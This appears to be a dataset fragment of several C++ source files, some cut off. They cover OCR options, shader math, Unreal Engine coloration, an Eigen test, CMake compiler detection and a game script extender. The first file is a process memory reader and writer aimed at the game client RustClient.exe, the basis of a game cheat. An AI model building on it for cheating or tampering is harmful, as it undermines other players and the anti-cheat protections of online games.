    "#include <Windows.h>\r\n#include <winternl.h>\r\n#include <Psapi.h>\r\n#include \"um.h\"\r\nbool cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_meth_setup( ) {HANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, NULL );if ( ss ) {HANDLE process = NULL;PROCESSENTRY32 pe;pe.dwSize = sizeof( PROCESSENTRY32 );if ( Process32First( ss, &pe ) ) {do {if ( !wcscmp( pe.szExeFile, ( L\"RustClient.exe\" ) ) ) {process = OpenProcess( PROCESS_ALL_ACCESS, false, pe.th32ProcessID );}} while ( Process32Next( ss, &pe ) );}CloseHandle( ss );crazy_process_handle = process;}return crazy_process_handle;}\r\nvoid cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read( uintptr_t address, void* buffer, size_t size ) {if (crazy_process_handle )ReadProcessMemory(crazy_process_handle, ( LPCVOID )address, buffer, size, 0 );}\r\nvoid cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_write( uintptr_t address, void* buffer, size_t size ) {if (crazy_process_handle )WriteProcessMemory(crazy_process_handle, ( LPVOID )address, &buffer, size, NULL );}\r\ncant_remove_due_to_strict_nda::crazy_material_dumper::crazymodule_t cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_get_module( const std::wstring& name ) {crazymodule_t mod = { 0 };HANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, GetProcessId(crazy_process_handle ) );if ( ss ) {MODULEENTRY32 me;me.dwSize = sizeof( MODULEENTRY32 );if ( Module32First( ss, &me ) ) {do {if ( !wcscmp( me.szModule, name.data( ) ) ) {mod.crazy_base = ( uint64_t )me.modBaseAddr;mod.crazy_size = ( uint64_t )me.modBaseSize;break;}} while ( Module32Next( ss, &me ) );}CloseHandle( ss );}return mod;}",
    "\n#include \"options.h\"\n#include <filesystem>\n#include <iostream>\n\nnamespace fs = std::filesystem;\n\nOptions convertRawOptions(std::unordered_map<std::string, std::any>& rawOptions, const std::string& assetDir,\n                          const std::string& debugOutputDir) {\n  Options options {};\n  if (rawOptions.count(\"isDebug\") > 0) {\n    options.is_debug = std::any_cast<bool>(rawOptions.at(\"isDebug\"));\n  }\n  if (rawOptions.count(\"debugOutputDir\") == 0) {\n    rawOptions[\"debugOutputDir\"] = debugOutputDir;\n  }\n  if (rawOptions.count(\"debugOutputDir\") > 0) {\n    options.debug_output_dir = std::any_cast<std::string>(rawOptions.at(\"debugOutputDir\"));\n    fs::create_directories(options.debug_output_dir);\n  }\n  if (rawOptions.count(\"recognitionImageMaxSize\") > 0) {\n    options.recognition_image_max_size = std::any_cast<double>(rawOptions.at(\"recognitionImageMaxSize\"));\n  }\n  if (rawOptions.count(\"detectionThreshold\") > 0) {\n    options.detection_threshold = std::any_cast<double>(rawOptions.at(\"detectionThreshold\"));\n  }\n  if (rawOptions.count(\"detectionBoxThreshold\") > 0) {\n    options.detection_box_threshold = std::any_cast<double>(rawOptions.at(\"detectionBoxThreshold\"));\n  }\n  if (rawOptions.count(\"detectionUnclipRatiop\") > 0) {\n    options.detection_unclip_ratiop = std::any_cast<double>(rawOptions.at(\"detectionUnclipRatiop\"));\n  }\n  if (rawOptions.count(\"detectionUseDilate\") > 0) {\n    options.detection_use_dilate = std::any_cast<bool>(rawOptions.at(\"detectionUseDilate\"));\n  }\n  if (rawOptions.count(\"detectionUsePolygonScore\") > 0) {\n    options.detection_use_polygon_score = std::any_cast<bool>(rawOptions.at(\"detectionUsePolygonScore\"));\n  }\n  if (rawOptions.count(\"detectionuseDirectionClassify\") > 0) {\n    options.use_direction_classify = std::any_cast<bool>(rawOptions.at(\"detectionuseDirectionClassify\"));\n  }\n  if (rawOptions.count(\"models\") == 0) {\n    rawOptions[\"models\"] = std::unordered_map<std::string, std::any> {\n        {\"detectionModelPath\", assetDir + \"/ch_PP-OCRv4_det_infer.onnx\"},\n        {\"recognitionModelPath\", assetDir + \"/ch_PP-OCRv4_rec_infer.onnx\"},\n        {\"classifierModelPath\", assetDir + \"/ch_ppocr_mobile_v2.0_cls_infer.onnx\"},\n        {\"dictionaryPath\", assetDir + \"/ppocr_keys_v1.txt\"}};\n  }\n  auto rawModels = std::any_cast<std::unordered_map<std::string, std::any>>(rawOptions.at(\"models\"));\n  auto& models = options.models;\n  if (rawModels.count(\"detectionModelPath\") == 0) {\n    throw std::runtime_error(\"Ocr.create options.models.detectionModelPath is required.\");\n  }\n  models.detection_model_path = std::any_cast<std::string>(rawModels.at(\"detectionModelPath\"));\n  if (rawModels.count(\"recognitionModelPath\") == 0) {\n    throw std::runtime_error(\"Ocr.create options.models.recognitionModelPath is required.\");\n  }\n  models.recognition_model_path = std::any_cast<std::string>(rawModels.at(\"recognitionModelPath\"));\n  if (rawModels.count(\"classifierModelPath\") == 0) {\n    throw std::runtime_error(\"Ocr.create options.models.classifierModelPath is required.\");\n  }\n  models.classifier_model_path = std::any_cast<std::string>(rawModels.at(\"classifierModelPath\"));\n  if (rawModels.count(\"dictionaryPath\") == 0) {\n    throw std::runtime_error(\"Ocr.create options.models.dictionaryPath is required.\");\n  }\n  models.dictionary_path = std::any_cast<std::string>(rawModels.at(\"dictionaryPath\"));\n  return options;\n}",
    "// Copyright 2024 by Owen Bulka.\n// All rights reserved.\n// This file is released under the \"MIT License Agreement\".\n// Please see the LICENSE.md file that should have been included as part\n// of this package.\n\n\n//\n// Math operations\n//\n\n\n/**\n * Compute the fractional portion of the value. Ex. 3.5 returns 0.5\n *\n * @arg value: The value to get the fractional portion of.\n *\n * @returns: The fractional portion of the value.\n */\ninline float fract(const float value)\n{\n    return value - floor(value);\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline void matmul(const float4x4 &m, const float4 &v, float4 &out)\n{\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float4 matmul(const float4x4 &m, const float4 &v)\n{\n    float4 out;\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n\n    return out;\n}\n\n\n/**\n * Multiply a 3d vector by a 3x3 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float3 matmul(const float3x3 &m, const float3 &v)\n{\n    return float3(\n        m[0][0] * v.x + m[0][1] * v.y + m[0][2] * v.z,\n        m[1][0] * v.x + m[1][1] * v.y + m[1][2] * v.z,\n        m[2][0] * v.x + m[2][1] * v.y + m[2][2] * v.z\n    );\n}\n\n\n/**\n * Convert the uv position in a latlong image to angles.\n *\n * @arg uvPosition: The UV position.\n *\n * @returns: The equivalent angles in radians.\n */\ninline float2 uvPositionToAngles(const float2 &uvPosition)\n{\n    return float2(\n        (uvPosition.x + 1.0f) * PI,\n        (1.0f - uvPosition.y) * PI / 2.0f\n    );\n}\n\n\n/**\n * Convert location of a pixel in an image into UV.\n *\n * @arg pixelLocation: The x, and y positions of the pixel.\n * @arg format: The image width, and height.\n *\n * @returns: The UV position.\n */\ninline float2 pixelsToUV(const float2 &pixelLocation, const float2 &format)\n{\n    return float2(\n        2.0f * pixelLocation.x / format.x - 1.0f,\n        2.0f * pixelLocation.y / format.y - 1.0f\n    );\n}\n\n\n/**\n * Convert a spherical unit vector (unit radius) to cartesion.\n *\n * @arg angles: The spherical angles in radians.\n *\n * @returns: The equivalent cartesion vector.\n */\ninline float3 sphericalUnitVectorToCartesion(const float2 &angles)\n{\n    const float sinPhi = sin(angles.y);\n    return float3(\n        cos(angles.x) * sinPhi,\n        cos(angles.y),\n        sin(angles.x) * sinPhi\n    );\n}\n\n\n/**\n * Get the position component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg position: The location to store the position.\n */\ninline void positionFromWorldMatrix(const float4x4 &worldMatrix, float3 &position)\n{\n    position = float3(\n        worldMatrix[0][3],\n        worldMatrix[1][3],\n        worldMatrix[2][3]\n    );\n}\n\n\n/**\n * Get the rotation component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg rotation: The location to store the rotation.\n */\ninline void rotationFromWorldMatrix(const float4x4 &worldMatrix, float3x3 &rotationMatrix)\n{\n    rotationMatrix[0][0] = worldMatrix[0][0];\n    rotationMatrix[0][1] = worldMatrix[0][1];\n    rotationMatrix[0][2] = worldMatrix[0][2];\n    rotationMatrix[1][0] = worldMatrix[1][0];\n    rotationMatrix[1][1] = worldMatrix[1][1];\n    rotationMatrix[1][2] = worldMatrix[1][2];\n    rotationMatrix[2][0] = worldMatrix[2][0];\n    rotationMatrix[2][1] = worldMatrix[2][1];\n    rotationMatrix[2][2] = worldMatrix[2][2];\n}\n\n\n//\n// Randomization functions\n//\n\n\n// Some random constants on the interval [1, 2]\n#define RAND_CONST_0 1.571411510193971f\n#define RAND_CONST_1 1.268632820084931f\n#define RAND_CONST_2 1.7880365647937733f\n#define RAND_CONST_3 1.3546987471558234f\n#define RAND_CONST_4 1.4365958250848703f\n#define RAND_CONST_5 1.7045380669435368f\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float random(const float seed)\n{\n    return fract(sin(73.1f * seed + 91.3458f) * 47453.5453f);\n}\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float2 random(const float2 &seed)\n{\n    return float2(\n        fract(sin(13.157f * seed.x + 71.743f) * 7513.471f),\n        fract(sin(97.519f * seed.y + 113.591f) * 47453.5453f)\n    );\n}\n\n\n/**\n * Create a random point that lies within the unit circle.\n *\n * @arg seed: The random seed.\n *\n *",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n#include \"CustomActorColorationRegister.h\"\n\n#include \"CustomActorColorationSettings.h\"\n#include \"GameFramework/ActorPrimitiveColorHandler.h\"\n\n#define LOCTEXT_NAMESPACE \"CustomActorColorationRegister\"\n\nUCustomActorColorationRegister::UCustomActorColorationRegister()\n{\n#if ENABLE_ACTOR_PRIMITIVE_COLOR_HANDLER\n\tif (HasAnyFlags(RF_ClassDefaultObject) && ExactCast<UCustomActorColorationRegister>(this))\n\t{\n\t\tconst UCustomActorColorationSettings* Settings = UCustomActorColorationSettings::Get();\n\t\t\n\t\t// Cast Shadow\n\t\tif(Settings->bUseColorationCastShadow)\n\t\t{\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"CastShadow\"), LOCTEXT(\"CastShadow\", \"Cast Shadow\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif (InPrimitiveComponent->CastShadow)\n\t\t\t\t{\n\t\t\t\t\treturn FLinearColor::Red;\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\n\t\t// Capsule Shadow\n\t\tif(Settings->bUseColorationCastCapsuleShadow)\n\t\t{\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"CastCapsuleShadow\"), LOCTEXT(\"CastCapsuleShadow\", \"Cast Capsule Shadow\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif (AActor* Actor = InPrimitiveComponent->GetOwner())\n\t\t\t\t{\n\t\t\t\t\tTArray<USkeletalMeshComponent*> SkelMeshComponents;\n\t\t\t\t\tActor->GetComponents(USkeletalMeshComponent::StaticClass(), SkelMeshComponents);\n\t\t\t\t\tfor (USkeletalMeshComponent* SkelMeshComponent : SkelMeshComponents)\n\t\t\t\t\t{\n\t\t\t\t\t\tconst bool bCastDirect = SkelMeshComponent->bCastCapsuleDirectShadow;\n\t\t\t\t\t\tconst bool bCastIndirect = SkelMeshComponent->bCastCapsuleIndirectShadow;\n\t\t\t\t\t\tif(bCastDirect)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif(bCastIndirect)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\treturn FLinearColor::Red; // Direct && Indirect\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\treturn FLinearColor::Green; // Direct\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if(bCastIndirect)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\treturn FLinearColor::Blue; // Indirect\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\n\t\t// PhysicalMaterial\n\t\tif(Settings->bUseColorationPhysicalMaterial)\n\t\t{\n\t\t\t// PhysicalMaterial Simple\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"PhysicalMaterialSimple\"), LOCTEXT(\"PhysicalMaterialSimple\", \"PhysicalMaterial Simple\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif(const FBodyInstance* BodyInstance = InPrimitiveComponent->GetBodyInstance())\n\t\t\t\t{\n\t\t\t\t\tconst UPhysicalMaterial* PhysicalMaterial = BodyInstance->GetSimplePhysicalMaterial();\n\t\t\t\t\tauto& ColorMap = UCustomActorColorationSettings::Get()->PhysicalMaterialColorMap;\n\t\t\t\t\tif(ColorMap.Contains(PhysicalMaterial))\n\t\t\t\t\t{\n\t\t\t\t\t\treturn *ColorMap.Find(PhysicalMaterial);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\n\t\t\t// PhysicalMaterial Complex\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"PhysicalMaterialComplex\"), LOCTEXT(\"PhysicalMaterialComplex\", \"PhysicalMaterial Complex\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif(const FBodyInstance* BodyInstance = InPrimitiveComponent->GetBodyInstance())\n\t\t\t\t{\n\t\t\t\t\tconst TArray<UPhysicalMaterial*> PhysicalMaterials = BodyInstance->GetComplexPhysicalMaterials();\n\n\t\t\t\t\tif(!PhysicalMaterials.IsEmpty())\n\t\t\t\t\t{\n\t\t\t\t\t\tauto& ColorMap = UCustomActorColorationSettings::Get()->PhysicalMaterialColorMap;\n\n\t\t\t\t\t\tFLinearColor ResultColor = FLinearColor::Black;\n\t\t\t\t\t\tfor (const auto PhysicalMaterial : PhysicalMaterials)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif(ColorMap.Contains(PhysicalMaterial))\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tResultColor += *ColorMap.Find(PhysicalMaterial);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn ResultColor / PhysicalMaterials.Num();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\n\t\t// CollisionPreset\n\t\tif(Settings->bUseColorationCollisionPreset)\n\t\t{\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"CollisionPreset\"), LOCTEXT(\"CollisionPreset\", \"Collision Preset\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tconst FName ProfileName = InPrimitiveComponent->GetCollisionProfileName();\n\t\t\t\tauto& ColorMap = UCustomActorColorationSettings::Get()->CollisionPresetColorMap;\n\t\t\t\tif(ColorMap.Contains(ProfileName))\n\t\t\t\t{\n\t\t\t\t\treturn *ColorMap.Find(ProfileName);\n\t\t\t\t}\n\t\t\t\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\t}\n#endif\n}\n",
    "// This file is part of Eigen, a lightweight C++ template library\n// for linear algebra.\n//\n// Copyright (C) 2008-2009 Gael Guennebaud <gael.guennebaud@inria.fr>\n//\n// This Source Code Form is subject to the terms of the Mozilla\n// Public License v. 2.0. If a copy of the MPL was not distributed\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n#include \"main.h\"\n\ntemplate <typename MatrixType>\nvoid array_for_matrix(const MatrixType& m) {\n  typedef typename MatrixType::Scalar Scalar;\n  typedef Matrix<Scalar, MatrixType::RowsAtCompileTime, 1> ColVectorType;\n  typedef Matrix<Scalar, 1, MatrixType::ColsAtCompileTime> RowVectorType;\n\n  Index rows = m.rows();\n  Index cols = m.cols();\n\n  MatrixType m1 = MatrixType::Random(rows, cols), m2 = MatrixType::Random(rows, cols), m3(rows, cols);\n\n  ColVectorType cv1 = ColVectorType::Random(rows);\n  RowVectorType rv1 = RowVectorType::Random(cols);\n\n  Scalar s1 = internal::random<Scalar>(), s2 = internal::random<Scalar>();\n\n  // scalar addition\n  VERIFY_IS_APPROX(m1.array() + s1, s1 + m1.array());\n  VERIFY_IS_APPROX((m1.array() + s1).matrix(), MatrixType::Constant(rows, cols, s1) + m1);\n  VERIFY_IS_APPROX(((m1 * Scalar(2)).array() - s2).matrix(), (m1 + m1) - MatrixType::Constant(rows, cols, s2));\n  m3 = m1;\n  m3.array() += s2;\n  VERIFY_IS_APPROX(m3, (m1.array() + s2).matrix());\n  m3 = m1;\n  m3.array() -= s1;\n  VERIFY_IS_APPROX(m3, (m1.array() - s1).matrix());\n\n  // reductions\n  VERIFY_IS_MUCH_SMALLER_THAN(m1.colwise().sum().sum() - m1.sum(), m1.squaredNorm());\n  VERIFY_IS_MUCH_SMALLER_THAN(m1.rowwise().sum().sum() - m1.sum(), m1.squaredNorm());\n  VERIFY_IS_MUCH_SMALLER_THAN(m1.colwise().sum() + m2.colwise().sum() - (m1 + m2).colwise().sum(),\n                              (m1 + m2).squaredNorm());\n  VERIFY_IS_MUCH_SMALLER_THAN(m1.rowwise().sum() - m2.rowwise().sum() - (m1 - m2).rowwise().sum(),\n                              (m1 - m2).squaredNorm());\n  VERIFY_IS_APPROX(m1.colwise().sum(), m1.colwise().redux(internal::scalar_sum_op<Scalar, Scalar>()));\n\n  // vector-wise ops\n  m3 = m1;\n  VERIFY_IS_APPROX(m3.colwise() += cv1, m1.colwise() + cv1);\n  m3 = m1;\n  VERIFY_IS_APPROX(m3.colwise() -= cv1, m1.colwise() - cv1);\n  m3 = m1;\n  VERIFY_IS_APPROX(m3.rowwise() += rv1, m1.rowwise() + rv1);\n  m3 = m1;\n  VERIFY_IS_APPROX(m3.rowwise() -= rv1, m1.rowwise() - rv1);\n\n  // empty objects\n  VERIFY_IS_EQUAL((m1.template block<0, Dynamic>(0, 0, 0, cols).colwise().sum()), RowVectorType::Zero(cols));\n  VERIFY_IS_EQUAL((m1.template block<Dynamic, 0>(0, 0, rows, 0).rowwise().sum()), ColVectorType::Zero(rows));\n  VERIFY_IS_EQUAL((m1.template block<0, Dynamic>(0, 0, 0, cols).colwise().prod()), RowVectorType::Ones(cols));\n  VERIFY_IS_EQUAL((m1.template block<Dynamic, 0>(0, 0, rows, 0).rowwise().prod()), ColVectorType::Ones(rows));\n\n  VERIFY_IS_EQUAL(m1.block(0, 0, 0, cols).colwise().sum(), RowVectorType::Zero(cols));\n  VERIFY_IS_EQUAL(m1.block(0, 0, rows, 0).rowwise().sum(), ColVectorType::Zero(rows));\n  VERIFY_IS_EQUAL(m1.block(0, 0, 0, cols).colwise().prod(), RowVectorType::Ones(cols));\n  VERIFY_IS_EQUAL(m1.block(0, 0, rows, 0).rowwise().prod(), ColVectorType::Ones(rows));\n\n  // verify the const accessors exist\n  const Scalar& ref_m1 = m.matrix().array().coeffRef(0);\n  const Scalar& ref_m2 = m.matrix().array().coeffRef(0, 0);\n  const Scalar& ref_a1 = m.array().matrix().coeffRef(0);\n  const Scalar& ref_a2 = m.array().matrix().coeffRef(0, 0);\n  VERIFY(&ref_a1 == &ref_m1);\n  VERIFY(&ref_a2 == &ref_m2);\n\n  // Check write accessors:\n  m1.array().coeffRef(0, 0) = 1;\n  VERIFY_IS_APPROX(m1(0, 0), Scalar(1));\n  m1.array()(0, 0) = 2;\n  VERIFY_IS_APPROX(m1(0, 0), Scalar(2));\n  m1.array().matrix().coeffRef(0, 0) = 3;\n  VERIFY_IS_APPROX(m1(0, 0), Scalar(3));\n  m1.array().matrix()(0, 0) = 4;\n  VERIFY_IS_APPROX(m1(0, 0), Scalar(4));\n}\n\ntemplate <typename MatrixType>\nvoid comparisons(const MatrixType& m) {\n  using std::abs;\n  typedef typename MatrixType::Scalar Scalar;\n  typedef typename NumTraits<Scalar>::Real RealScalar;\n\n  Index rows = m.rows();\n  Index cols = m.cols();\n\n  Index r = internal::random<Index>(0, rows - 1), c = internal::random<Index>(0, cols - 1);\n\n  MatrixType m1 = MatrixType::Random(rows, cols), m2 = MatrixType::Random(rows, cols), m3(rows, cols);\n\n  VERIFY(((m1.array() + Scalar(1)) > m1.array()).all());\n  VERIFY(((m1.array() - Scalar(1)) < m1.array()).all());\n  if (rows * cols > 1) {\n    m3 = m1;\n    m3(r, c) += 1;\n    VERIFY(!(m1.array() < m3.array()).all());\n    VERIFY(!(m1.array() > m3.array()).all());\n  }\n\n  // comparisons to scalar\n  VERIFY((m1.array() != (m1(r, c) + 1)).any());\n  VERIFY((m1.array() > (m1(r, c) - 1)).any());\n  VERIFY((m1.array() < (m1(r, c) + 1)).any());\n  VERIFY((m1.array() == m1(r, c)).any());\n  VERIFY(m1.cwiseEqual(m1(r, c)).any());\n\n  // test Select\n  VERIFY_IS_APPROX((m1.array() < m2.array()).select(m1, m2), m1.cwiseMin(m2));\n  VERIFY_IS_APPROX((m1.array() > m2.array()).select(m1, m2), m1.cwiseMax(m2));\n  Scalar mid = (m1.cwiseAbs().minCoeff() + m",
    "/* This source file must have a .cpp extension so that all C++ compilers\r\n   recognize the extension without flags.  Borland does not know .cxx for\r\n   example.  */\r\n#ifndef __cplusplus\r\n# error \"A C compiler has been selected for C++.\"\r\n#endif\r\n\r\n#if !defined(__has_include)\r\n/* If the compiler does not have __has_include, pretend the answer is\r\n   always no.  */\r\n#  define __has_include(x) 0\r\n#endif\r\n\r\n\r\n/* Version number components: V=Version, R=Revision, P=Patch\r\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\r\n\r\n#if defined(__COMO__)\r\n# define COMPILER_ID \"Comeau\"\r\n  /* __COMO_VERSION__ = VRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\r\n\r\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\r\n# define COMPILER_ID \"Intel\"\r\n# if defined(_MSC_VER)\r\n#  define SIMULATE_ID \"MSVC\"\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_ID \"GNU\"\r\n# endif\r\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\r\n     except that a few beta releases use the old format with V=2021.  */\r\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\r\n#  if defined(__INTEL_COMPILER_UPDATE)\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\r\n#  else\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\r\n#  endif\r\n# else\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\r\n   /* The third version component from --version is an update index,\r\n      but no macro is provided for it.  */\r\n#  define COMPILER_VERSION_PATCH DEC(0)\r\n# endif\r\n# if defined(__INTEL_COMPILER_BUILD_DATE)\r\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\r\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\r\n# endif\r\n# if defined(_MSC_VER)\r\n   /* _MSC_VER = VVRR */\r\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n# elif defined(__GNUG__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n# endif\r\n# if defined(__GNUC_MINOR__)\r\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n# endif\r\n# if defined(__GNUC_PATCHLEVEL__)\r\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\r\n# define COMPILER_ID \"IntelLLVM\"\r\n#if defined(_MSC_VER)\r\n# define SIMULATE_ID \"MSVC\"\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_ID \"GNU\"\r\n#endif\r\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\r\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\r\n * VVVV is no smaller than the current year when a version is released.\r\n */\r\n#if __INTEL_LLVM_COMPILER < 1000000L\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\r\n#else\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\r\n#endif\r\n#if defined(_MSC_VER)\r\n  /* _MSC_VER = VVRR */\r\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n#elif defined(__GNUG__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n#endif\r\n#if defined(__GNUC_MINOR__)\r\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n#endif\r\n#if defined(__GNUC_PATCHLEVEL__)\r\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n#endif\r\n\r\n#elif defined(__PATHCC__)\r\n# define COMPILER_ID \"PathScale\"\r\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\r\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\r\n# if defined(__PATHCC_PATCHLEVEL__)\r\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\r\n# define COMPILER_ID \"Embarcadero\"\r\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\r\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\r\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\r\n\r\n#elif defined(__BORLANDC__)\r\n# define COMPILER_ID \"Borland\"\r\n  /* __BORLANDC__ = 0xVRR */\r\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\r\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\r\n\r\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\r\n# define COMPILER_ID \"Watcom\"\r\n   /* __WATCOMC__ = VVRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\r\n# if (__WATCOMC__ % 10) > 0\r\n#  define C",
    "#include \"plugin.h\"\n#include \"CRunningScript.h\"\n#include \"CTheScripts.h\"\n#include \"CMessages.h\"\n//#include \"ScmExtenderAPI.h\"\n\nclass ScmExtender {\npublic: \n    static inline std::unordered_map<int32_t, int8_t(*)(int32_t*)> mapOfNewOpcodes = {};\n\n    static __declspec(dllexport) void AddOneCommand(int32_t command, int8_t(*func)(int32_t*)) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end())\n            std::cout << \"[SCRIPT] Command id \" << command << \" overwritten\" << std::endl;\n\n        mapOfNewOpcodes[command] = func;\n    }\n\n    static inline CRunningScript* currentScript = nullptr;\n    static __declspec(dllexport) void CollectParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            